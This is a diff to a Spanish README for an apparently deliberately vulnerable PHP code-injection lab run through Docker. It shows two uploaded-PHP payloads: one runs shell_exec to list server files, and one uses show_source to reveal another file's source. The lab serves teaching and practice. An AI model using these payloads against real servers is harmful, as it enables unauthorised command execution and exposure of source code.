@@ -11,16 +11,18 @@ docker run --publish 8080:80 ghcr.io/ingenieroricardo/codeinjection:latest
 
 Al no tener validaciones se pueden enviar PHP que se pueden ejecutar como esto:
 
-Conocer los archivos en el servidor
 ```php
 <?php
   $salida = shell_exec("cd .. && ls");
   echo "<pre>$salida</pre>";
 ?>
 ```
-Ver codigo fuente
+Con este codigo podemos conocer los archivos en el servidor
+
+
 ```php
 <?php
   show_source("../archivos.php");
 ?>
 ```
+Con este codigo podemos ver codigo fuente
